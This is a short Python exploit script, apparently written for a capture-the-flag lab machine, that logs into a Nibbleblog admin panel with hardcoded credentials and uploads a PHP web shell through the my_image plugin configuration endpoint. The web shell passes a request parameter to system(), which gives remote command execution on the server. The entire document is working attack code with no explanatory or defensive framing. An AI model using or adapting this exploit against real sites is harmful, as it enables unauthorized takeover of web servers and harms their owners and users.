import requests
import sys

target   = "http://10.10.10.75/nibbleblog/admin.php"
username = "admin"
password = "nibbles"
#cmd      = input("[+]Optional, Enter command to execute: ")

def upload(target, username, password, cmd="pwn"):
        payload = "<?php echo system($_REQUEST['rse']); ?>"
        session = requests.Session()
        login_data = { 'username':username,'password':password,'login':''}
        print("Logging in to " + target)
        req_url_login = session.post(target,data=login_data,verify=False)
        if req_url_login.status_code == 200:
              print("Successfully logged in")
        else:
               print (f"Login failed: HTTP {req_url_login.status_code}")
               sys.exit(1)

        file_data = {
            "plugin":"my_image",
            "title":"blahblah",
            "position":"4",
            "caption":"test",
        }

        file_content = {
            'rse':('rse2.php',payload,'application/x-php',{'Content-Disposition':'form-data'}),
        }

        url_upload = target + "?controller=plugins&action=config&plugin=my_image"
        req_url_upload = session.post(url_upload,data=file_data,files=file_content,verify=False)
        if req_url_upload.status_code == 200:
            print("Logged in and was able to upload exploit!")
        else:
            print("Something went wrong with the upload!")
            exit()

upload(target,username,password)
